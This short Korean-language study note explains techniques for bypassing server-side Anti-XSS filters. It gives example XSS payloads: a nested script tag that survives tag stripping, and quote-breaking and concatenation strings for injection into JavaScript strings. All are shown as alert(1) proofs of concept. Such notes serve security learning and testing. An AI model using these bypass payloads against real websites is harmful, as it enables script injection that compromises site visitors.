# Anti XSS Bypass

Anti XSS는 XSS를 막기 위해 서버에서 설정해놓은 Black List, White List 기반 필터링이다.

Anti XSS Bypass는 우회하는 것을 목적으로 두고 있다.

# White List 필터링 우회 방법

허용해야 할 태그, 속성을 제외한 나머지 모든 문자열에 대해서 필터링하는 방법이다.   
대체로 XSS에 대한 권고 시 가장 추천하는 방식이며   
대체로 게시판과 같이 특수문자를 필터링할 수 없어 태그, 속성에 대해 필터링할 때 사용된다.
</br>
</br>

script 태그 필터링
```
Input: <script>alert(1)</script>
Ouput: alert(1)
```
```
Input: <scr<script>ipt>alert(1)</scr<script>ipt>
Ouput: <script>alert(1)</script>
```
</br>

주석 필터링   
(javascript 내에 XSS가 들어간 상황)   
```
Input: ";alert(1);//
Output: run="alert(1)";
```
```
Input: "+alert(1)+prompt("
Output: run=""+alert(1)+run="";
```
</br>
</br>

